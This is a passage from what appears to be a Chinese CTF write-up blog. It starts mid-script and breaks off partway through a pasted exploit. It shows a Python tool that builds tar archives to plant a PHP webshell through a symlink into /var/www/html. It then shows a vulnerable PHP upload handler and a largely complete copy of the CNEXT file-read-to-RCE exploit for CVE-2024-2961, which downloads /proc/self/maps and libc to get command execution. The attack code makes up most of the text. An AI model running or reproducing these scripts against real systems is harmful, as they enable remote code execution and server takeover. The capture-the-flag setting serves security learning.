class="comment"># symlink  </span></span><br><span class="line">        ti.linkname = link_target  </span><br><span class="line">        ti.mtime = <span class="built_in">int</span>(time.time())  </span><br><span class="line">        tar.addfile(ti)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Created&quot;</span>, path, <span class="string">&quot;-&gt; symlink&quot;</span>, link_name, <span class="string">&quot;-&gt;&quot;</span>, link_target)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_webshell_tar</span>(<span class="params">path=<span class="string">&quot;webshell.tar&quot;</span>, file_entry=<span class="string">&quot;my_link/webshell.php&quot;</span>, content=php_shell</span>):  </span><br><span class="line">    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(path, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> tar:  </span><br><span class="line">        tinfo = tarfile.TarInfo(name=file_entry)  </span><br><span class="line">        tinfo.size = <span class="built_in">len</span>(content)  </span><br><span class="line">        tinfo.mtime = <span class="built_in">int</span>(time.time())  </span><br><span class="line">        tar.addfile(tinfo, io.BytesIO(content))  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Created&quot;</span>, path, <span class="string">&quot;-&gt; contains&quot;</span>, file_entry)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    make_symlink_tar(<span class="string">&quot;symlink.tar&quot;</span>, <span class="string">&quot;my_link&quot;</span>, <span class="string">&quot;/var/www/html&quot;</span>)  </span><br><span class="line">    make_webshell_tar(<span class="string">&quot;webshell.tar&quot;</span>, <span class="string">&quot;my_link/webshell.php&quot;</span>, php_shell)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nFiles created in:&quot;</span>, os.path.abspath(<span class="string">&quot;.&quot;</span>))  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Files:&quot;</span>, os.path.exists(<span class="string">&quot;symlink.tar&quot;</span>), os.path.exists(<span class="string">&quot;webshell.tar&quot;</span>))</span><br></pre></td></tr></table></figure></li></ol><h2 id="SeRce"><a href="#SeRce" class="headerlink" title="SeRce"></a>SeRce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleFileUpload</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$uploadDirectory</span> = <span class="string">&#x27;/tmp/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;文件上传失败。&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^a-zA-Z0-9_\-\.]/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;文件名不符合要求。&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$destination</span> = <span class="variable">$uploadDirectory</span> . <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$destination</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; tar -xvf &#x27;</span> . <span class="variable">$filename</span>.<span class="string">&#x27;&amp;&amp;pwd&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$destination</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;文件移动失败。&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">handleFileUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>去年的老trick了, fileRead to RCE</p><p><a href="https://github.com/ambionics/cnext-exploits">https://github.com/ambionics/cnext-exploits</a></p><p>改一下脚本直接用</p><p>cnext-exploit.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># CNEXT: PHP file-read to RCE (CVE-2024-2961)  </span></span><br><span class="line"><span class="comment"># Date: 2024-05-27  </span></span><br><span class="line"><span class="comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># TODO Parse LIBC to know if patched  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># INFORMATIONS  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># To use, implement the Remote class, which tells the exploit how to send the payload.  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="keyword">import</span> zlib  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass  </span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ConnectionError, ChunkedEncodingError  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> ten <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">HEAP_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>  </span><br><span class="line">BUG = <span class="string">&quot;劄&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Remote</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;A helper class to send the payload and download files.  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">    The logic of the exploit is always the same, but the exploit needs to know how to    download files (/proc/self/maps and libc) and how to send the payload.  </span></span><br><span class="line"><span class="string">    The code here serves as an example that attacks a page that looks like:  </span></span><br><span class="line"><span class="string">    ```php    &lt;?php  </span></span><br><span class="line"><span class="string">    $data = file_get_contents($_POST[&#x27;file&#x27;]);    echo &quot;File contents: $data&quot;;    ```  </span></span><br><span class="line"><span class="string">    Tweak it to fit your target, and start the exploit.    &quot;&quot;&quot;</span>  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:  </span><br><span class="line">        self.url = url  </span><br><span class="line">        self.session = Session()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; Response:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.  </span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>        <span class="keyword">return</span> self.session.post(self.url + <span class="string">&quot;/?exp=1&quot;</span>, data=&#123;<span class="string">&quot;filetoread&quot;</span>: path&#125;)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Returns the contents of a remote file.  </span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>        path = <span class="string">f&quot;php://filter/convert.base64-encode/resource=<span class="subst">&#123;path&#125;</span>&quot;</span>  </span><br><span class="line">        response = self.send(path)  </span><br><span class="line">        data = response.re.search(<span class="string">b&quot;File Contents:(.*)&quot;</span>, flags=re.S).group(<span class="number">1</span>)  </span><br><span class="line">        <span class="keyword">return</span> base64.decode(data)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@entry  </span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;url&quot;</span>, <span class="string">&quot;Target URL&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;command&quot;</span>, <span class="string">&quot;Command to run on the system; limited to 0x140 bytes&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;sleep&quot;</span>, <span class="string">&quot;Time to sleep to assert that the exploit worked. By default, 1.&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;heap&quot;</span>, <span class="string">&quot;Address of the main zend_mm_heap structure.&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@arg(<span class="params">  </span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;pad&quot;</span>,  </span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot;</span>  </span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;operations with this size, increase this. Defaults to 20.&quot;</span>,  </span></span></span><br><span class="line"><span class="params"><span class="meta"></span>)  </span></span><br><span class="line"><span class="meta">@dataclass  </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;CNEXT exploit: RCE using a file read primitive in PHP.&quot;&quot;&quot;</span>  </span><br><span class="line">  </span><br><span class="line">    url: <span class="built_in">str</span>  </span><br><span class="line">    command: <span class="built_in">str</span>  </span><br><span class="line">    sleep: <span class="built_in">int</span> = <span class="number">1</span>  </span><br><span class="line">    heap: <span class="built_in">str</span> = <span class="literal">None</span>  </span><br><span class="line">    pad: <span class="built_in">int</span> = <span class="number">20</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__post_init__</span>(<span class="params">self</span>):  </span><br><span class="line">        self.remote = Remote(self.url)  </span><br><span class="line">        self.log = logger(<span class="string">&quot;EXPLOIT&quot;</span>)  </span><br><span class="line">        self.info = &#123;&#125;  </span><br><span class="line">        self.heap = self.heap <span class="keyword">and</span> <span class="built_in">int</span>(self.heap, <span class="number">16</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_vulnerable</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various  </span></span><br><span class="line"><span class="string">        wrappers and filters that the exploit needs.        &quot;&quot;&quot;</span>  </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">safe_download</span>(<span class="params">path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">            <span class="keyword">try</span>:  </span><br><span class="line">                <span class="keyword">return</span> self.remote.download(path)  </span><br><span class="line">            <span class="keyword">except</span> ConnectionError:  </span><br><span class="line">                failure(<span class="string">&quot;Target not [b]reachable[/] ?&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">check_token</span>(<span class="params">text: <span class="built_in">str</span>, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:  </span><br><span class="line">            result = safe_download(path)  </span><br><span class="line">            <span class="keyword">return</span> text.encode() == result  </span><br><span class="line">  </span><br><span class="line">        text = tf.random.string(<span class="number">50</span>).encode()  </span><br><span class="line">        base64 = b64(text, misalign=<span class="literal">True</span>).decode()  </span><br><span class="line">        path = <span class="string">f&quot;data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        result = safe_download(path)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> text <span class="keyword">not</span> <span class="keyword">in</span> result:  </span><br><span class="line">            msg_failure(<span class="string">&quot;Remote.download did not return the test string&quot;</span>)  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;--------------------&quot;</span>)  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Expected test string: <span class="subst">&#123;text&#125;</span>&quot;</span>)  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Got: <span class="subst">&#123;result&#125;</span>&quot;</span>)  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;--------------------&quot;</span>)  </span><br><span class="line">            failure(<span class="string">&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        msg_info(<span class="string">&quot;The [i]data://[/] wrapper works&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        text = tf.random.string(<span class="number">50</span>)  </span><br><span class="line">        base64 = b64(text.encode(), misalign=<span class="literal">True</span>).decode()  </span><br><span class="line">        path = <span class="string">f&quot;php://filter//resource=data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span>  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_token(text, path):  </span><br><span class="line">            failure(<span class="string">&quot;The [i]php://filter/[/] wrapper does not work&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        msg_info(<span class="string">&quot;The [i]php://filter/[/] wrapper works&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        text = tf.random.string(<span class="number">50</span>)  </span><br><span class="line">        base64 = b64(compress(text.encode()), misalign=<span class="literal">True</span>).decode()  </span><br><span class="line">        path = <span class="string">f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_token(text, path):  </span><br><span class="line">            failure(<span class="string">&quot;The [i]zlib[/] extension is not enabled&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        msg_info(<span class="string">&quot;The [i]zlib[/] extension is enabled&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        msg_success(<span class="string">&quot;Exploit preconditions are satisfied&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_file</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">        <span class="keyword">with</span> msg_status(<span class="string">f&quot;Downloading [i]<span class="subst">&#123;path&#125;</span>[/]...&quot;</span>):  </span><br><span class="line">            <span class="keyword">return</span> self.remote.download(path)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_regions</span>(<span class="params">self</span>) -&gt; <span class="built_in">list</span>[Region]:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;</span>  </span><br><span class="line">        maps = self.get_file(<span class="string">&quot;/proc/self/maps&quot;</span>)  </span><br><span class="line">        maps = maps.decode()  </span><br><span class="line">        PATTERN = re.<span class="built_in">compile</span>(  </span><br><span class="line">            <span class="string">r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="string">r&quot;.*&quot;</span> <span class="string">r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot;</span> <span class="string">r&quot;(.*)&quot;</span>  </span><br><span class="line">        )  </span><br><span class="line">        regions = []  </span><br><span class="line">        <span class="keyword">for</span> region <span class="keyword">in</span> table.split(maps, strip=<span class="literal">True</span>):  </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span> := PATTERN.<span class="keyword">match</span>(region):  </span><br><span class="line">                start = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>), <span class="number">16</span>)  </span><br><span class="line">                stop = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>), <span class="number">16</span>)  </span><br><span class="line">                permissions = <span class="keyword">match</span>.group(<span class="number">3</span>)  </span><br><span class="line">                path = <span class="keyword">match</span>.group(<span class="number">4</span>)  </span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;/&quot;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> path:  </span><br><span class="line">                    path = path.rsplit(<span class="string">&quot; &quot;</span>, <span class="number">1</span>)[-<span class="number">1</span>]  </span><br><span class="line">                <span class="keyword">else</span>:  </span><br><span class="line">                    path = <span class="string">&quot;&quot;</span>  </span><br><span class="line">                current = Region(start, stop, permissions, path)  </span><br><span class="line">                regions.append(current)  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                <span class="built_in">print</span>(maps)  </span><br><span class="line">                failure(<span class="string">&quot;Unable to parse memory mappings&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        self.log.info(<span class="string">f&quot;Got <span class="subst">&#123;<span class="built_in">len</span>(regions)&#125;</span> memory regions&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> regions  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_symbols_and_addresses</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;</span>  </span><br><span class="line">        regions = self.get_regions()  </span><br><span class="line">  </span><br><span class="line">        